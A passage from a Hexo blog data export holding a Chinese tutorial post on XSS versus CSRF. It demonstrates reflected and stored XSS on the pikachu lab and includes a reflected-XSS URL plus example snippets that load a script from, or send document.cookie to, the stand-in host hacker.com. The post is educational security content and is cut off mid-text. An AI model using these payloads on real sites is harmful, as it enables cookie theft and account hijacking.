class_\">SyntheticEvent</span>&lt;T = <span class=\"title class_\">Element</span>, E = <span class=\"title class_\">Event</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseSyntheticEvent</span>&lt;E, <span class=\"title class_\">EventTarget</span> &amp; T, <span class=\"title class_\">EventTarget</span>&gt; &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 具体的事件类型：</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">FormEvent</span>&lt;T = <span class=\"title class_\">Element</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T&gt; &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">KeyboardEvent</span>&lt;T = <span class=\"title class_\">Element</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T, <span class=\"title class_\">NativeKeyboardEvent</span>&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">altKey</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">MouseEvent</span>&lt;T = <span class=\"title class_\">Element</span>, E = <span class=\"title class_\">NativeMouseEvent</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T, E&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">altKey</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>"},{"title":"XSS和CSRF的区别及防御","date":"2022-03-08T08:49:20.000Z","_content":"\n在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。\n\n<!-- more -->\n\n介绍之前，先上下维基百科：\n\n- XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。\n\n- CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。\n\n## XSS\n\n用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。\n\nXSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。\n\n### 反射型\n\n反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面）\n\n流程图如下：\n\n{% img /gallery/react+ts.png %}\n\n通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—>别的用户访问这个URL—>恶意代码被服务器解析—>传递给前端渲染实现攻击。\n\n> 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它\n\n[pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html：\n\n{% img /gallery/xss-1.jpg %}\n\n可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？\n\n{% img /gallery/xss-2.jpg %}\n\n{% img /gallery/xss-3.jpg %}\n\n脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。\n\n现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。\n\n```html\n<script src=\"http://hacker.com/hacker.js\"></script>\n```\n\n```javascript\nvar img = new Image();\nimg.src = \"http://hacker.com/hack.png?q=\" + document.cookie;\ndocument.body.append(img);\n```\n\n### 存储型\n\n存储型 XSS 会把用户输入的数据 \"存储\" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。\n\n反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。\n\n比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。\n\n流程图如下：\n\n{% img /gallery/xss-storage.jpg %}\n\n通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—>后端不做处理传入数据库—>别的用户访问页面—>后端从数据库中调用XSS代码—>前端渲染(执行js脚本)恶意代码实现攻击。\n\n这里还是用 [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu) 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本：\n\n{% img /gallery/xss-4.jpg %}\n\n提交后并刷新页面，这段脚本被注入到 html 中，并执行了\n\n","source":"_posts/XSS和CSRF的区别及防御.md","raw":"---\ntitle: XSS和CSRF的区别及防御\ndate: 2022-03-08 16:49:20\ntags:\n---\n\n在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。\n\n<!-- more -->\n\n介绍之前，先上下维基百科：\n\n- XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。\n\n- CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。\n\n## XSS\n\n用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。\n\nXSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。\n\n### 反射型\n\n反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面）\n\n流程图如下：\n\n{% img /gallery/react+ts.png %}\n\n通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—>别的用户访问这个URL—>恶意代码被服务器解析—>传递给前端渲染实现攻击。\n\n> 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它\n\n[pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html：\n\n{% img /gallery/xss-1.jpg %}\n\n可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？\n\n{% img /gallery/xss-2.jpg %}\n\n{% img /gallery/xss-3.jpg %}\n\n脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。\n\n现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。\n\n```html\n<script src=\"http://hacker.com/hacker.js\"></script>\n```\n\n```javascript\nvar img = new Image();\nimg.src = \"http://hacker.com/hack.png?q=\" + document.cookie;\ndocument.body.append(img);\n```\n\n### 存储型\n\n存储型 XSS 会把用户输入的数据 \"存储\" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。\n\n反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。\n\n比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。\n\n流程图如下：\n\n{% img /gallery/xss-storage.jpg %}\n\n通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—>后端不做处理传入数据库—>别的用户访问页面—>后端从数据库中调用XSS代码—>前端渲染(执行js脚本)恶意代码实现攻击。\n\n这里还是用 [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu) 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本：\n\n{% img /gallery/xss-4.jpg %}\n\n提交后并刷新页面，这段脚本被注入到 html 中，并执行了\n\n","slug":"XSS和CSRF的区别及防御","published":1,"updated":"2022-03-09T02:26:47.245Z","_id":"cl0i4jhcm0000clfyc6s4b2xw","comments":1,"layout":"post","photos":[],"link":"","content":"<html><head></head><body><p>在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。</p>\n<span id=\"more\"></span>\n\n<p>介绍之前，先上下维基百科：</p>\n<ul>\n<li><p>XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>\n</li>\n<li><p>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>\n</li>\n</ul>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><p>用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p>\n<p>XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。</p>\n<h3 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h3><p>反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面）</p>\n<p>流程图如下：</p>\n<img src=\"/gallery/react+ts.png\" class=\"\">\n\n<p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。</p>\n<blockquote>\n<p>如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它</p>\n</blockquote>\n<p><a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">pikachu</a>，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html：</p>\n<img src=\"/gallery/xss-1.jpg\" class=\"\">\n\n<p>可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？</p>\n<img src=\"/gallery/xss-2.jpg\" class=\"\">\n\n<img src=\"/gallery/xss-3.jpg\" class=\"\">\n\n<p>脚本被插入到 htmlh中，并且被执行。这时将这段链接 <a href=\"http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;submit=submit#\">http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit#</a> 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。</p>\n<p>现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。</p>\n<figure class=\"highlight html hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"http://hacker.com/hacker.js\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight javascript hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">var</span> img = <span class=\"hljs-keyword\">new</span> <span class=\"title class_\">Image</span>();</span><br><span class=\"line\">img.<span class=\"hljs-property\">src</span> = <span class=\"hljs-string\">\"http://hacker.com/hack.png?q=\"</span> + <span class=\"variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>;</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"hljs-property\">body</span>.<span class=\"title function_\">append</span>(img);</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"存储型\"><a href=\"#存储型\" class=\"headerlink\" title=\"存储型\"></a>存储型</h3><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p>\n<p>反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。</p>\n<p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p>\n<p>流程图如下：</p>\n<img src=\"/gallery/xss-storage.jpg\" class=\"\">\n\n<p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。</p>\n<p>这里还是用 <a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">pikachu</a> 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本：</p>\n<img src=\"/gallery/xss-4.jpg\" class=\"\">\n\n<p>提交后并刷新页面，这段脚本被注入到 html 中，并执行了</p>\n</body></html>","site":{"data":{}},"_categories":[],"_tags":[],"excerpt":"<html><head></head><body><p>在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。</p></body></html>","more":"<p>介绍之前，先上下维基百科：</p>\n<ul>\n<li><p>XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>\n</li>\n<li><p>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>\n</li>\n</ul>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><p>用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p>\n<p>XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。</p>\n<h3 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h3><p>反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面）</p>\n<p>流程图如下：</p>\n<img src=\"/gallery/react+ts.png\" class=\"\">\n\n<p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。</p>\n<blockquote>\n<p>如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它</p>\n</blockquote>\n<p><a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">pikachu</a>，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html：</p>\n<img src=\"/gallery/xss-1.jpg\" class=\"\">\n\n<p>可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？</p>\n<img src=\"/gallery/xss-2.jpg\" class=\"\">\n\n<img src=\"/gallery/xss-3.jpg\" class=\"\">\n\n<p>脚本被插入到 htmlh中，并且被执行。这时将这段链接 <a href=\"http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;submit=submit#\">http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit#</a> 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。</p>\n<p>现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://hacker.com/hacker.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>();</span><br><span class=\"line\">img.<span class=\"property\">src</span> = <span class=\"string\">&quot;http://hacker.com/hack.png?q=&quot;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>;</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">append</span>(img);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"存储型\"><a href=\"#存储型\" class=\"headerlink\" title=\"存储型\"></a>存储型</h3><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p>\n<p>反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。</p>\n<p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p>\n<p>流程图如下：</p>\n<img src=\"/gallery/xss-storage.jpg\" class=\"\">\n\n<p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。</p>\n<p>这里还是用 <a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">pikachu</a> 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本：</p>\n<img src=\"/gallery/xss-4.jpg\" class=\"\">\n\n<p>提交后并刷新页面，这段脚本被注入到 html 中，并执行了</p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}